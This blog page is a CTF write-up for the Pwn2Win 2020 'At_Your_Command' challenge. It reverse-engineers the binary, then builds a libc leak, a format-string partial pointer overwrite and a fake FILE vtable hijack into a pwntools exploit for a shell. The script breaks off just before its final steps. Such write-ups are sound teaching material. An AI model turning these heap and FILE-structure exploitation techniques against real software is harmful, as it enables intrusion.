<!DOCTYPE html>
<html lang="en-us">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Source Themes Academic 4.8.0">

  

  
  
  
  
  
    
    
    
  
  

  <meta name="author" content="Kerro &amp; Anis_Boss">

  
  
  
    
  
  <meta name="description" content="Challenge Details    Event Challenge Category Link     Pwn2Win At_Your_Command PWN https://ctftime.org/event/961    Description  Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the RBSes.">

  
  <link rel="alternate" hreflang="en-us" href="/post/pwn2win-2020-at_your_command/">

  


  
  
  
  <meta name="theme-color" content="rgb(0, 136, 204)">
  

  
  

  
  
  
  
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">

    
    
    
      
    
    
      
      
        
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" disabled>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark">
        
      
    

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
    

    

    
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
      
    
      

      
      

      
    
      

      
      

      
    
      

      
      
        
      

      
    
      

      
      

      
    

  

  
  
  
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=B612+Mono:400,700%7COrbitron:400,700&display=swap">
  

  
  
  
  
  <link rel="stylesheet" href="/css/academic.css">

  





<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177400255-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];

  function gtag() {
      dataLayer.push(arguments);
  }

  function trackOutboundLink(url, target) {
    gtag('event', 'click', {
         'event_category': 'outbound',
         'event_label': url,
         'transport_type': 'beacon',
         'event_callback': function () {
           if (target !== '_blank') {
             document.location = url;
           }
         }
    });
    console.debug("Outbound link clicked: " + url);
  }

  function onClickCallback(event) {
    if ((event.target.tagName !== 'A') || (event.target.host === window.location.host)) {
      return;
    }
    trackOutboundLink(event.target, event.target.getAttribute('target'));  
  }

  gtag('js', new Date());
  gtag('config', 'UA-177400255-1', {});

  
  document.addEventListener('click', onClickCallback, false);
</script>


  


  
  

  

  <link rel="manifest" href="/index.webmanifest">
  <link rel="icon" type="image/png" href="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_32x32_fill_lanczos_center_2.png">
  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_192x192_fill_lanczos_center_2.png">

  <link rel="canonical" href="/post/pwn2win-2020-at_your_command/">

  
  
  
  
  
  
  
    
    
  
  
  <meta property="twitter:card" content="summary">
  
  <meta property="og:site_name" content="pwn-diaries">
  <meta property="og:url" content="/post/pwn2win-2020-at_your_command/">
  <meta property="og:title" content="Pwn2Win 2020   At_Your_Command | pwn-diaries">
  <meta property="og:description" content="Challenge Details    Event Challenge Category Link     Pwn2Win At_Your_Command PWN https://ctftime.org/event/961    Description  Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the RBSes."><meta property="og:image" content="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_512x512_fill_lanczos_center_2.png">
  <meta property="twitter:image" content="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_512x512_fill_lanczos_center_2.png"><meta property="og:locale" content="en-us">
  
    
      <meta property="article:published_time" content="2020-05-31T16:20:07&#43;01:00">
    
    <meta property="article:modified_time" content="2020-05-31T16:20:07&#43;01:00">
  

  


    






  




<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/post/pwn2win-2020-at_your_command/"
  },
  "headline": "Pwn2Win 2020   At_Your_Command",
  
  "datePublished": "2020-05-31T16:20:07+01:00",
  "dateModified": "2020-05-31T16:20:07+01:00",
  
  "author": {
    "@type": "Person",
    "name": "Kerro \u0026 Anis_Boss"
  },
  
  "publisher": {
    "@type": "Organization",
    "name": "pwn-diaries",
    "logo": {
      "@type": "ImageObject",
      "url": "/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_192x192_fill_lanczos_center_2.png"
    }
  },
  "description": "Challenge Details    Event Challenge Category Link     Pwn2Win At_Your_Command PWN https://ctftime.org/event/961    Description  Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the RBSes."
}
</script>

  

  


  


  





  <title>Pwn2Win 2020   At_Your_Command | pwn-diaries</title>

</head>

<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="dark">

  <aside class="search-results" id="search">
  <div class="container">
    <section class="search-header">

      <div class="row no-gutters justify-content-between mb-3">
        <div class="col-6">
          <h1>Search</h1>
        </div>
        <div class="col-6 col-search-close">
          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
        </div>
      </div>

      <div id="search-box">
        
        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
        
      </div>

    </section>
    <section class="section-search-results">

      <div id="search-hits">
        
      </div>

    </section>
  </div>
</aside>


  







<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
  <div class="container">

    
    <div class="d-none d-lg-inline-flex">
      <a class="navbar-brand" href="/">pwn-diaries</a>
    </div>
    

    
    <button type="button" class="navbar-toggler" data-toggle="collapse"
            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span><i class="fas fa-bars"></i></span>
    </button>
    

    
    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
      <a class="navbar-brand" href="/">pwn-diaries</a>
    </div>
    

    
    
    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">

      
      <ul class="navbar-nav d-md-inline-flex">
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#about"><span>Home</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#posts"><span>Posts</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#contact"><span>Contact</span></a>
        </li>

        
        

      

        
      </ul>
    </div>

    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
      
      <li class="nav-item">
        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
      </li>
      

      

      

    </ul>

  </div>
</nav>


  <article class="article">

  












  

  
  
  
<div class="article-container pt-3">
  <h1>Pwn2Win 2020   At_Your_Command</h1>

  

  
    


<div class="article-metadata">

  
  

  
  <span class="article-date">
    
    
      
    
    May 31, 2020
  </span>
  

  

  
  <span class="middot-divider"></span>
  <span class="article-reading-time">
    13 min read
  </span>
  

  
  
  

  
  

</div>

    














  
</div>



  <div class="article-container">

    <div class="article-style">
      <h4 id="challenge-details">Challenge Details</h4>
<table>
<thead>
<tr>
<th>Event</th>
<th>Challenge</th>
<th>Category</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Pwn2Win</td>
<td>At_Your_Command</td>
<td>PWN</td>
<td><a href="https://ctftime.org/event/961">https://ctftime.org/event/961</a></td>
</tr>
</tbody>
</table>
<h3 id="description">Description</h3>
<blockquote>
<p>Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the  RBSes. Our exploration team was only able to have limited access to this machine and extract the binaries from the programming service. As it  runs with high privilege, exploiting it will allow us to extract more  data from that server. Those data will bring us closer to the discovery  of the person responsible for the Rebellion. Can you help us with this  task?</p>
<p><strong>Server:</strong> nc command.pwn2.win 1337</p>
<p>
<a href="https://static.pwn2win.party/at_your_command_f08a76a2aedf590841e99886aad3f93b86030877098f3bc945fdea8f44a7b392.tar.gz" target="_blank" rel="noopener">Link</a></p>
<p>
<a href="https://storage.cloud.google.com/pwn2win-files/at_your_command_f08a76a2aedf590841e99886aad3f93b86030877098f3bc945fdea8f44a7b392.tar.gz" target="_blank" rel="noopener">Mirror</a></p>
<p>ID: at_your_command</p>
<p>Score: 267</p>
<p>Solves: 26</p>
<pre><code class="language-bash">nc command.pwn2.win 1337
</code></pre>
</blockquote>
<h3 id="tldl">TL;DL</h3>
<ul>
<li>
<p>Leak Libc address through unsorted bin chunks by partial overwrite.</p>
</li>
<li>
<p>Construct a fake file structure in a controlled area (concatenation of 2 chunks).</p>
</li>
<li>
<p>Overwrite File pointer using format string bug.</p>
</li>
<li>
<p>Get shell through calling fclose() \o/ !</p>
<p>Pwn2Win was a rough CTF competition, we were able only to solve one PWN challenge which took us nearly 6 hours to be the 4th team who solved it with our teammate 
<a href="https://twitter.com/ThamerBaccouch" target="_blank" rel="noopener">Aracna</a>.</p>
</li>
</ul>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>First of all, starting with static analysis the given binary has nearly full protection as show below:</p>
<pre><code class="language-bash">$ checksec ./command
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
</code></pre>
<p>As always, let&rsquo;s start with just running the binary blindly and check the implemented functionalities through playing with different inputs.</p>
<pre><code>$ ./command 
Welcome to the command system
=============================
Your name: test_name
Welcome test_name

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&gt; 1
Priority: aa
Command: bbb
The command has been included at index 0

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&gt; 2
Command index: 0

Priority: 0
Command: bbb

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&gt; 4

Index 0
Priority: 0
Command: bbb

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&gt; 3
Command index: 0
The command has been successfully deleted

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&gt; 5

Sending commands...
Are you sending the commands to which rbs?
aa
You command Mr. test_name!
</code></pre>
<p>the binary after reading a name it looks like it has the following commands:</p>
<ul>
<li><code>Include command</code> : It takes 2 inputs a priority and a text command and stores them somewhere.</li>
<li><code>Review command</code>: Display the provided details of an included command via an index.</li>
<li><code>Delete command</code>: Delete an included command via an index.</li>
<li><code>List commands</code>: List all the included commands</li>
<li><code>Send commands</code>: It asks for an input then exit after printing the provided name in the first step.</li>
</ul>
<p>Let&rsquo;s fire up IDA and start analyzing the functions.</p>
<h5 id="main-function">main function</h5>
<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  time_t v3; // rax
  FILE *stream; // [rsp+0h] [rbp-70h]
  ssize_t v6; // [rsp+8h] [rbp-68h]
  char s; // [rsp+10h] [rbp-60h]
  unsigned __int64 v8; // [rsp+68h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init_chall(); 
  welcome_message();
  printf(&quot;Your name: &quot;, a2);
  v6 = read(0, buf, 0xCuLL);
  if ( v6 &amp;&amp; buf[v6 - 1] == 10 )
    buf[v6 - 1] = 0;
  printf(&quot;Welcome %s\n&quot;, buf);
  memset(&amp;s, 0, 0x50uLL);
  manage_commands((__int64)&amp;s);
  puts(&amp;byte_15FA);
  puts(&quot;Sending commands...&quot;);
  v3 = time(0LL);
  snprintf(filename, 0x2DuLL, &quot;/commands/%ld&quot;, v3);
  stream = fopen(filename, &quot;w&quot;);
  if ( !stream )
  {
    printf(&quot;[ERROR] An error happened while opening the file&quot;);
    exit(2);
  }
  send_command((__int64)&amp;s, &amp;stream);
  fclose(stream);
  return 0LL;
}
</code></pre>
<p>the binary is stripped so we had to rename the functions as shown in the pseudo-code above. The binary just run in the following execution flow.</p>
<ol>
<li><code>init_chall()</code> : It just disables buffering and sets alarm after 60 seconds.</li>
<li><code>welcome_message()</code> : it displays a hello message.</li>
<li>It reads a name from <code>stdin</code> then prints <code>Welcome Your_Name</code>.</li>
<li><code>manage_commands()</code>: it manages the commands as explained before (include, review, &hellip;).</li>
<li><code>send_command()</code>: it logs all the commands provided into a file.</li>
</ol>
<p>Let&rsquo;s dive into <code>manage_commands</code> function since the main functionalities are implemented in it.</p>
<pre><code class="language-c">__int64 __fastcall manage_commands(__int64 a1)
{
  __int64 result; // rax
  while ( 1 )
  {
    menu(); //it prints the menu described before.
    result = (unsigned int)read_long_int(); // it reads 8 bytes long
    switch ( result )
    {
      case 1LL:
        include_command(a1);
        break;
      case 2LL:
        review_command(a1);
        break;
      case 3LL:
        delete_command(a1);
        break;
      case 4LL:
        list_commands(a1);
        break;
      case 5LL:
        return result;
      default:
        error();
        return result;
    }
  }
}
</code></pre>
<p>After renaming the functions, this subroutine is handling the following functions depending on user input:</p>
<h5 id="include_command-function">Include_command function</h5>
<pre><code class="language-c">int __fastcall include_command(__int64 a1)
{
  int i; // [rsp+14h] [rbp-1Ch]
  ssize_t v3; // [rsp+18h] [rbp-18h]

  for ( i = 0; ; ++i )
  {
    if ( i &gt; 9 )
      return puts(&quot;[INFO] The authorized limit has been reached!&quot;);
    if ( !*(_QWORD *)(8LL * i + a1) )
      break;
  }
  *(_QWORD *)(8LL * i + a1) = malloc(0x188uLL); 
  printf(&quot;Priority: &quot;);
  **(_QWORD **)(8LL * i + a1) = (int)read_long_int();
  printf(&quot;Command: &quot;);
  v3 = read(0, (void *)(*(_QWORD *)(8LL * i + a1) + 8LL), 0x170uLL);
  if ( v3 )
  {
    if ( *(_BYTE *)(*(_QWORD *)(8LL * i + a1) + v3 - 1 + 8) == 10 )
      *(_BYTE *)(*(_QWORD *)(8LL * i + a1) + v3 - 1 + 8) = 0;
  }
  return printf(&quot;The command has been included at index %d\n&quot;, (unsigned int)i);
}
</code></pre>
<p>First, the function checks if the user has already supplied 10 commands which is the maximum number of allowed inputs at the same time. Then it allocates <code>0x188</code> chunk through <code>malloc</code> function and it reads 4 bytes input followed by a command string finally stores them in the parameter array <code>a1</code> which is a <code>command</code>s array.</p>
<p><code>Command</code> is a structure designed as follow:</p>
<pre><code class="language-c">struct commands{
    long long priority;
    char command[0x170];
}
</code></pre>
<h5 id="review_command-function">Review_command function</h5>
<pre><code class="language-c">__int64 __fastcall review_command(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf(&quot;Command index: &quot;);
  result = read_long_int();
  v2 = result;
  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 9 )
  {
    result = *(_QWORD *)(8LL * (int)result + a1);
    if ( result )
    {
      puts(&amp;byte_15FA);
      result = display_command(*(_QWORD *)(8LL * v2 + a1));
    }
  }
  return result;
}
</code></pre>
<p>The function reads an index from the user then it checks if the index given points to an allocated command structure in order to prevent Use After Free. If it&rsquo;s the case it displays the priority along side with the command string.</p>
<h5 id="delete_command-function">Delete_command function</h5>
<pre><code class="language-c">int __fastcall delete_command(__int64 a1)
{
  __int64 v1; // rax
  int v3; // [rsp+1Ch] [rbp-4h]

  printf(&quot;Command index: &quot;);
  LODWORD(v1) = read_long_int();
  v3 = v1;
  if ( (int)v1 &gt;= 0 &amp;&amp; (int)v1 &lt;= 9 )
  {
    v1 = *(_QWORD *)(8LL * (int)v1 + a1);
    if ( v1 )
    {
      free(*(void **)(8LL * v3 + a1));
      *(_QWORD *)(8LL * v3 + a1) = 0LL;
      LODWORD(v1) = puts(&quot;The command has been successfully deleted&quot;);
    }
  }
  return v1;
}
</code></pre>
<p>The function reads an index from the user, it checks if the index given points to a valid command structure. If it&rsquo;s the case it will free the correspondent chunk and null the pointer in <code>a1</code> array in order to prevent the Double Free.</p>
<h5 id="list_command-function">List_command function</h5>
<pre><code class="language-c">__int64 __fastcall list_commands(__int64 a1)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i &lt;= 9; ++i )
  {
    result = *(_QWORD *)(8LL * i + a1);
    if ( result )
    {
      puts(&amp;byte_15FA);
      printf(&quot;Index %d\n&quot;, (unsigned int)i);
      result = display_command(*(_QWORD *)(8LL * i + a1));
    }
  }
  return result;
}
</code></pre>
<p>the function just iterates over <code>a1</code> array and displays the different allocated commands.</p>
<p>the 5th choice just returns to the main function.</p>
<p>After the function <code>manage_commands</code> returns, it creates a file then it executes the <code>send_commands</code> function.</p>
<pre><code class="language-c">unsigned __int64 __fastcall send_command(__int64 a1, FILE **a2)
{
  int i; // [rsp+14h] [rbp-3Ch]
  __int64 v4; // [rsp+18h] [rbp-38h]
  char src; // [rsp+20h] [rbp-30h]
  char s; // [rsp+30h] [rbp-20h]
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  memset(&amp;s, 0, 0x14uLL);
  memset(&amp;src, 0, 0x10uLL);
  puts(&quot;Are you sending the commands to which rbs?&quot;);
  v4 = (int)read_long_int();
  fprintf(*a2, &quot;Id: %lld\n&quot;, v4);
  for ( i = 0; i &lt;= 9; ++i )
  {
    if ( *(_QWORD *)(8LL * i + a1) )
      fprintf(*a2, &quot;%lld:%s\n&quot;, **(_QWORD **)(8LL * i + a1), *(_QWORD *)(8LL * i + a1) + 8LL);
  }
  snprintf(&amp;src, 0xCuLL, buf);
  strcpy(&amp;s, &quot;Mr. &quot;);
  strcat(&amp;s, &amp;src);
  printf(&quot;You command %s!\n&quot;, &amp;s);
  return __readfsqword(0x28u) ^ v7;
}
</code></pre>
<p>The function reads a 4 bytes long long and then just stores the different commands into the opened file. After that, it calls <code>snprintf</code> without the format parameter which leads to a format string vulnerability but with a very limited number of chars 0xC. since we control the parameter buf which the name supplied in the first step.</p>
<p>Then it concatenates the name with the string &ldquo;Mr. &quot; and prints the final message to the <code>stdout</code>.</p>
<p>Finally, it returns to the main function and calls <code>fclose()</code> before exiting.</p>
<h2 id="exploitation">Exploitation</h2>
<p>We start by implementing the wrappers needed to communicate with the binary.</p>
<pre><code class="language-python">from pwn import *
from pwn import log as Log
from time import sleep

def log(title,value):
    Log.info(title + &quot;: {} &quot;.format(hex(value)))
period = 0.2

def include(priority,command):
    p.sendline(&quot;1&quot;)
    p.recv(8000)
    p.sendline(str(priority))
    p.recv(8000)
    p.send(command)
    sleep(period)
    p.recv(8000)

def review(index):
    p.sendline(&quot;2&quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recvuntil(&quot;Command: &quot;)
    data = p.recvline().strip()
    p.recv(8000)
    return data

def delete(index):
    p.sendline(&quot;3&quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recv(8000)

def init(name):
    p.sendline(name)
    p.recv(8000)
</code></pre>
<h4 id="leaking-libc-address">Leaking Libc address</h4>
<p>Since it allocates 0x188 bytes, which is lower then 0x408, which is the maximum size that a tcache bin can hold.
because of that the first 7 freed chunks will go to tcache bin and  the next one will go to the unsorted bin and since the unsorted bin is a doubly linked list we can leak <b>BK</b> pointer if we can provide and empty command string through the following steps.</p>
<ol>
<li>
<p>Allocates a chunk</p>
<p>first state of the chunk</p>
<p><img src="/img/allocated.png" alt="Allocated Chunk"></p>
</li>
<li>
<p>Freed chunk</p>
<p>The state of the freed chunk that goes to unsorted bin</p>
<p><img src="/img/freed.png" alt="Freed Chunk"></p>
</li>
<li>
<p>Reallocated chunk</p>
<p><img src="/img/leaked.png" alt="Reallocated Chunk"></p>
<p>when we reallocate the freed chunk that is stored in the unsorted bin, if we can provide an empty input as a command string as shown in the 3rd diagram we can persist the state of <b>BK</b> pointer in the same place as command string and it can be displayed through <code>review_command</code> function ==&gt; Libc Leak \o/ !</p>
<pre><code class="language-python">    p=process(&quot;./command&quot;)
    p.recv(8000)
    payload = &quot;&quot;
    payload += &quot;RANDOM_NAME&quot;
    init(payload)
    #allocates 9 chunks (7 tcache + 1 in order to prevent consolidating with top chunk + 1 to unsorted bin)
    for i in range(9):
        include(123,&quot;abc&quot;)
    #frees 8 chunks ( 7 tcache + 1 unsorted)
    for i in range(8):
        delete(i)
 # allocates 7 chunks to empty tcache since it has the allocation priority 
    for i in range(7):
        include(123,chr(65+i)*3)
    #this chunk allocated from unsorted bin
    include(123,&quot;a&quot;)
 #Will be explained below
    data = review(7)
    leak = u64(data.ljust(8,&quot;\x00&quot;))
    leak = leak &amp; 0xffffffffffffff00
    leak = leak | 0xa0
    log(&quot;leak&quot;,leak)
</code></pre>
<p>Since we couldn&rsquo;t send an empty string to the binary as command text we decided to make one byte overwrite on the <b>BK</b> pointer and because the <b>LSB</b> of the main arena stored is always 0xa0 for the challenge&rsquo;s libc provided (2.27)</p>
<pre><code class="language-bash">$ python solver.py 
[+] Starting local process './command': pid 24613
[*] leak: 0x7fb4a343aca0 
[*] Switching to interactive mode
$
</code></pre>
</li>
</ol>
<h4 id="getting-shell">Getting Shell</h4>
<p>In the <code>send_command</code> function after opening the file for writing the different commands provided, it calls <code>snprintf</code> with a format string vulnerability with the provided name as a parameter.</p>
<pre><code class="language-bash">   0x557573c5134d:    mov    esi,0xc
   0x557573c51352:    mov    rdi,rax
   0x557573c51355:    mov    eax,0x0
=&gt; 0x557573c5135a:    call   0x557573c50a70 &lt;snprintf@plt&gt;
   0x557573c5135f:    lea    rax,[rbp-0x20]
   0x557573c51363:    mov    DWORD PTR [rax],0x202e724d
   0x557573c51369:    mov    BYTE PTR [rax+0x4],0x0
   0x557573c5136d:    lea    rdx,[rbp-0x30]
Guessed arguments:
arg[0]: 0x7ffd4bcac690 --&gt; 0x0 
arg[1]: 0xc ('\x0c')
arg[2]: 0x557573e52060 (&quot;YOUR_NAME&quot;)
[------------------------------------stack-------------------------------------]
0000| 0x7ffd4bcac670 --&gt; 0x7ffd4bcac6d0 --&gt; 0x557574364200 --&gt; 0xfbad2c84 
0008| 0x7ffd4bcac678 --&gt; 0x7ffd4bcac6e0 --&gt; 0x557574363260 --&gt; 0x7b ('{')
0016| 0x7ffd4bcac680 --&gt; 0xa73e52080 
0024| 0x7ffd4bcac688 --&gt; 0x0 
0032| 0x7ffd4bcac690 --&gt; 0x0 
0040| 0x7ffd4bcac698 --&gt; 0x0 
0048| 0x7ffd4bcac6a0 --&gt; 0x0 
0056| 0x7ffd4bcac6a8 --&gt; 0x0 
</code></pre>
<p>As shown in the gdb context above, the top of the stack contains a pointer on the <code>_IO_FILE_plus</code> structure for the opened file.</p>
<p>So the idea is, if we manage to overwrite that pointer in order to point to our fake file structure. This will allow us to hijack the vtable pointer. From there we can redirect the code execution when the binary calls <code>fclose()</code> and since the <code>snprintf</code> juste use 12 bytes only as length, this make it harder for us to full control the pointer on the stack.</p>
<p>To bypass this limitation, since the structure is located at the heap we need only to partially overwrite the pointer to make it point to our controlled data.</p>
<h5 id="fake-file-structure">Fake File Structure</h5>
<p>The provided libc version is higher then 2.23 which make the assertion of the vtable pointer inside <code>_libc_IO_vtables</code> section.
the default File structure is as the following (stderr example) :</p>
<pre><code class="language-c">$2 = {
  file = {
    _flags = 0xfbad2087, 
    _IO_read_ptr = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_read_end = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_read_base = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_write_base = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_write_ptr = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_write_end = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_buf_base = 0x7f9470711703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;, 
    _IO_buf_end = 0x7f9470711704 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7f9470711760 &lt;_IO_2_1_stdout_&gt;, 
    _fileno = 0x2, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = &quot;&quot;, 
    _lock = 0x7f94707128b0 &lt;_IO_stdfile_2_lock&gt;, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7f9470710780 &lt;_IO_wide_data_2&gt;, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = '\000' &lt;repeats 19 times&gt;
  }, 
  vtable = 0x7f947070d2a0 &lt;_IO_file_jumps&gt;
}
</code></pre>
<p>our goal is to construct a similar structure inside the heap and overwrite the file pointer to point to our Fake file. In that way when calling <code>fclose()</code> the program will call our controlled <code>vtable</code> address.</p>
<p>We shall overwrite the <code>vtable</code> in such a manner so that instead of calling the regular FILE associated function, <code>_IO_str_overflow</code> would be called. Since we can already forge <code>file pointer</code>, we can control the execution flow with one_gadget call.</p>
<p>For deep diving into File Structure Exploitation, here is a useful 
<a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="noopener">link</a> that describes well the exploitation process.</p>
<p>If we manage to overwrite by one byte the pointer located into the stack, we fall into our controlled data but due to size limitation we can&rsquo;t fully write our fake file structure which has size 192 without overflowing the next chunk (Default File chunk) which is not the case (no overflow for us). so we don&rsquo;t have choices but overwriting two bytes with null byte. but this will just make the pointer points to the area before the heap which we don&rsquo;t control :( !</p>
<p>we came up with a clever workaround by just making 10 allocations to make the heap size higher then 0x1000 and by any chance (brute force FTW) if the heap base just ends with 0x#f000 then when nulling the last two bytes of the pointer we fall into 2 controlled chunks (<code># : any random byte</code>) because of the default File pointer ends with 0x*0200. (<code>  * = # + 1</code> )</p>
<p>So final idea is to divide the fake File structure between two controlled chunks and taking consideration of the 2nd chunk metadata.</p>
<pre><code class="language-python">    fake1=&quot;&quot;
    fake1+=p64(0xfbad2400) #flags
    fake1+=p64(0)*8
    fake1+=p64(0)*2

    fake2=p64(_IO_lock)*3 #to avoide siegsegv
    fake2+=p64(0xffffffffffffffff)
    fake2+=p64(0)
    fake2+=p64(0)
    fake2+=p64(0)*6
    fake2+=p64(str_overflow-136) #points to str_overflow
    fake2+=p64(one_gadget) #(char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);

    for i in range(10):
        delete(i)

    for i in range(8):
        include(123,&quot;A&quot;*5)

    include(0,&quot;A&quot;*280+fake1) #1st part
    include(0,fake2) #2nd part
</code></pre>
<p>The final exploit is here \o/ !</p>
<pre><code class="language-python">from pwn import *
from pwn import log as Log
from time import sleep


def log(title,value):
    Log.info(title + &quot;: {} &quot;.format(hex(value)))
period = 0.2

def include(priority,command):
    p.sendline(&quot;1&quot;)
    p.recv(8000)
    p.sendline(str(priority))
    p.recv(8000)
    p.send(command)
    sleep(period)
    p.recv(8000)


def review(index):
    p.sendline(&quot;2&quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recvuntil(&quot;Command: &quot;)
    data = p.recvline().strip()
    p.recv(8000)
    return data

def delete(index):
    p.sendline(&quot;3&quot;)
    p.recv(8000)
    p.sendline(str(index))
    p.recv(8000)

def init(name):
    p.sendline(name)
    p.recv(8000)


for _ in range(100):
    #p = process(&quot;./command&quot;)
    p=remote(&quot;command.pwn2.win&quot;,1337)
    p.recv(8000)
    payload = &quot;&quot;
    payload += &quot;%4$hn&quot;
    init(payload)

    for i in range(9):
        include(123,&quot;abc&quot;)
    for i in range(8):
        delete(i)

    for i in range(7):
        include(123,chr(65+i)*3)

    include(123,&quot;a&quot;)

    data = review(7)
    leak = u64(data.ljust(8,&quot;\x00&quot;))
    leak = leak &amp; 0xffffffffffffff00
    leak = leak | 0xa0
    log(&quot;leak&quot;,leak)
    base = leak - 0x3ebca0
    str_overflow = base + 0x3e8378
    one_gadget = base + 0x4f322
    _IO_lock=base+0x3ed8b0
    log(&quot;base&quot;,base)
    log(&quot;str_overflow&quot;,str_overflow)
    log(&quot;one_gadget&quot;,one_gadget)
    include(123,&quot;KKKKKKKKKKKKK&quot;)

    fake1=&quot;&quot;
    fake1+=p64(0xfbad2400)
    fake1+=p64(0)*8
    fake1+=p64(0)*2

    fake2=p64(_IO_lock)*3
    fake2+=p64(0xffffffffffffffff)
    fake2+=p64(0)
    fake2+=p64(0)
    fake2+=p64(0)*6
    fake2+=p64(str_overflow-136)
    fake2+=p64(one_gadget)

